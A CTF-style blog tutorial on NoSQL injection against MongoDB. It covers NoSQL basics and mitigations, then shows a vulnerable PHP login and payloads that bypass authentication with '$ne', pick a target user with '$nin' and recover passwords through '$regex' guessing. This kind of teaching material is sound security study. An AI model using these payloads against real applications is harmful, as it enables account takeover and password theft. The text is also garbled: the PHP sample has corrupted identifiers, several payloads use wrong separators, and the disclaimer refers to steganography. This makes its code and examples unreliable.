---
title: NO SQL INJECTION
date: 2023-06-19 12:00:40 +/-TTTT
categories: [learning, web]
tags: [ctf]     # TAG names should always be lowercase
---

# Introduction 

`NoSQL`, which stands for `Not Only SQL,` is a term used to describe a category of databases that depart from the traditional relational database management system (RDBMS) model. Unlike RDBMS, which is based on structured query language (SQL) and uses tables, rows, and columns to organize and retrieve data, NoSQL databases provide a flexible and scalable approach for storing and managing data.

NoSQL databases emerged to address the limitations of RDBMS in handling large volumes of unstructured or semi-structured data, as well as to meet the needs of modern web applications with high traffic and dynamic schemas. 

They offer several advantages over traditional databases, such as :

* `Scalability` : NoSQL databases are designed to scale horizontally, allowing them to handle large amounts of data and high traffic loads across multiple servers or clusters. They can easily accommodate increasing data volumes and user demands.

* `Flexibility in Data Models` : NoSQL databases are schema-less or have flexible schemas, which means they can store data in various formats, including key-value pairs, document-oriented, columnar, or graph structures. This flexibility enables developers to adapt the database schema to changing application requirements without modifying the entire database structure.

* `High Performance` : NoSQL databases are optimized for specific data access patterns, providing fast read and write operations. They achieve high performance by relaxing certain transactional guarantees and focusing on efficient data retrieval rather than complex relational operations.

* `Distributed Architecture` : NoSQL databases often adopt a distributed architecture, allowing data to be spread across multiple servers or nodes. This distribution enables data replication, fault tolerance, and data availability even in the event of hardware failures or network issues.

* `Horizontal Scalability` : NoSQL databases can scale horizontally by adding more servers or nodes to a cluster, which allows for seamless expansion as data and traffic increase. This approach contrasts with the vertical scalability of traditional databases, which involve upgrading hardware to handle more significant workloads.

`Types of NoSQL databases include :`

* Key-Value Stores : These databases store data as key-value pairs, making them simple and efficient for caching and fast retrieval. Examples include Redis and Riak.

* Document Databases : These databases store data in flexible, semi-structured document formats, such as JSON or XML. They provide rich query capabilities and are suitable for content management systems and real-time analytics. Examples include MongoDB and CouchDB.

* Columnar Databases : These databases organize data into columns rather than rows, making them efficient for handling large amounts of data and complex queries. They are commonly used in big data analytics. Examples include Apache Cassandra and Apache HBase.

* Graph Databases : These databases focus on storing and traversing relationships between entities in a graph structure. They excel at handling complex and interconnected data. Examples include Neo4j and Amazon Neptune.

`It's important` to note that NoSQL databases are not a replacement for RDBMS in all scenarios. They excel in use cases involving large-scale data storage, real-time analytics, high-speed data retrieval, and flexible schemas. However, they may not be the best choice for applications that heavily rely on complex transactions and strict data consistency.

When considering NoSQL databases, it's essential to evaluate the `specific requirements and characteristics of your application` to choose the most suitable type of NoSQL database that aligns with your needs.

NoSQL databases, such as `MongoDB`, may not use SQL for `queries`, but they still rely on user input for querying data. This introduces the risk of NoSQL injection if developers fail to properly `sanitize the input`.

`The key` distinction between SQL injection and NoSQL injection lies in `the grammar and syntax of the query languages`. Attempting to perform SQL injection with an SQL-based attack string is unlikely to succeed against NoSQL databases. NoSQL databases lack a standardized query language, but their query syntax often bears similarities since they serve similar purposes.

One common scenario for NoSQL injection is attacking web applications built on the MEAN `(MongoDB, Express, Angular, Node)` stack. MEAN applications use JSON to pass data, which aligns with the structure used by MongoDB. Injecting malicious JSON code into a MEAN application can enable injection attacks against the underlying MongoDB database.

To mitigate the risk of NoSQL injection, it is crucial to implement the following preventive measures :

* `Input Validation` : Apply strict input validation to ensure that the received data does not contain malicious characters or code. Utilize appropriate filtering and data sanitization mechanisms.

* `Parameterized Queries` : Employ parameterized queries or prepared statements to avoid directly incorporating user input into database queries. By treating the input as data rather than part of the query, the risk of injection can be significantly reduced.

* `Whitelist Input Validation` : Create a whitelist of valid characters for each type of user input. Validate that the input adheres to the defined rules and requirements.

* `Least Privilege Principle` : Grant minimal access and privileges to the database application. Limit user access rights to only the necessary operations.

* `Update and Maintenance` : Ensure that your NoSQL database software is regularly updated to the latest version, which includes security patches and fixes.

# MongoDB

Much like `MySQL, MariaDB, or PostgresSQL`, MongoDB is another database where you can store data in an ordered way. MongoDB allows you to retrieve subsets of data in a quick and structured form. If you are familiar with relational databases, you can assume MongoDB works similarly to any other database. The major exception is that the information isn't stored on tables but rather in `documents`.

For example, let's say we are creating a `web application for the HR department`, and we would like to store basic employee information. You would then create a document for each employee containing the data in a `format` that looks like this :

```json
{"_id" : ObjectId("5f077332de2cdf808d26cd74")"username" : "lalalala", "first_name" : "otong", "last_name" : "sure", "age" : "65", "email" : "tong@example.com" }
```

# people Collection 

| Field         | Value                            |
| ------------- | -------------------------------- |
| **_id**       | ObjectId("5f077332de2cdf808d26cd74") |
| **username**  | lalalala                         |
| **first_name**| otong                            |
| **last_name** | sure                             |
| **age**       | 65                               |
| **email**     | tong@example.com                 |

`MongoDB` allows you to `group multiple documents` with a similar function together in higher hierarchy structures called collections for organizational purposes. Collections are the equivalent of tables in relational databases.

A `database in MongoDB` is a container that holds multiple collections.  It provides a logical grouping for collections that are related to each other in some way.

## HR Database

| Collection    | Description                                   |
| ------------- | --------------------------------------------- |
| **people**    | Collection that stores employee information    |
| **payroll**   | Collection that stores payroll data            |
| **branches**  | Collection that stores branch information      |

If we wanted to build a filter so that only the documents where the last_name is `otong` are retrieved, our filter would look like this:

```js
['last_name' => 'otong']
```

`As a result, this query only retrieves the second document.`

If we wanted to filter the documents where the gender is male, and the last_name is `Otong`, we would have the following filter:

```js
['gender' => 'male', 'last_name' => 'Otong']
```

If we wanted to retrieve all documents where the age is less than 25, we could use the following filter :

```js
['age' => ['$lt'=>'25']]
```

Reference : https://www.mongodb.com/docs/manual/reference/operator/query/

many server-side programming languages allow passing array variables by using a special syntax on the query string of an HTTP Request. For the purpose of this example, let's focus on the following code written in PHP for a simple login page :

```php
?php
$con = new MongoDBVDriverWanager("mongodb://localhost:port")j

if(isset($_POST) && isset($_POST['user']) && isset($_POST['pass'])){
    $user = $_POST['user'];
    $pass = $_POST['pass'];

    $q = new MongoDB\Driver\Query(['username' => $user, 'password'=> $pass]);
    $record = $con =>executeQuery('myapp.login', $q);
    $record = iterator_to_array($record);

    if(sizeof($record)>0){
        $usr = $record[0];

        session_start();
        $_SESSION['loggin'] = true;
        $_SESSION['uid'] = $usr->username;

        header('Location: /menu.php');
        die();
    }
}
header('Location: /?err=1')
```

web application make a query to MongoDB, useing `myapp` database and `login` collection, requesting any document that passes the filter.

```
['username'=>$user, 'password'=>$pass]
```

there are `$user` and `$pass` obtained directly from HTTP POST parameters.

If somehow we could send an array to the $user and $pass variables with the following content :

```js
$user = ['$ne'=>'xxxx'] 

$pass = ['$ne'=>'yyyy'] 
```

The resulting filter would end up looking like this:

```js
['username'=>['$ne'=>'xxxx'], 'password'=>['$ne'=>'yyyy']]
```

# Bypassing the login screen

original login :

* `user=asd&pass=asd&remember=on`

To Modify : 

* `user[$ne]=asd$pass[$ne]=aselole&remember=on`

# Logging in as other users

We have managed to bypass the application's login screen, but with the former technique, we can only login as the first user returned by the database. By making use of the `$nin` operator, we are going to modify our payload so that we can control which user we want to obtain.

First, the `$nin` operator allows us to create a filter by specifying criteria where the desired documents have some field, not in a list of values. So if we would want to log in as any user except for the user admin, we could modify our payload to look like this :

* `user[$nin][]=admin&pass[$ne]=aselole&remember=on`

# Extracting users' passwords

However, it is important to try to extract the actual passwords in use as they might be reused in other services. To accomplish this, we will be abusing the `$regex` operator to ask a series of questions to the server that allow us to recover the passwords via a process that resembles playing the game hangman.

First, let's take one of the users discovered before and try to guess the length of his password. We will be using the following payload to do that :

* `user=admin&pass[$regex]=^.{7}$rememberme=on`

Notice that we are asking the database if there is a user with a username of admin and a password that matches the `regex: ^.{7}$.` This basically represents a wildcard word of `length 7`. Since the server responds with a login error, we know the password length for the user admin isn't `7`.

if you get length regex work, you should asking if the admin password matches the regex `^c....$`. Means to start lowercase.

for example : 

* `len (7) -> ^c......$`

Note : process can be repeated for the other letters until the full password is recovered

# DISCLAIMER
```
This cheatsheet is intended to guide CTF players in their research. This cheatsheet is not representative of modern steganography/seganalysis techniques, and its content does match with the creation of an interesting challenges 😉.
```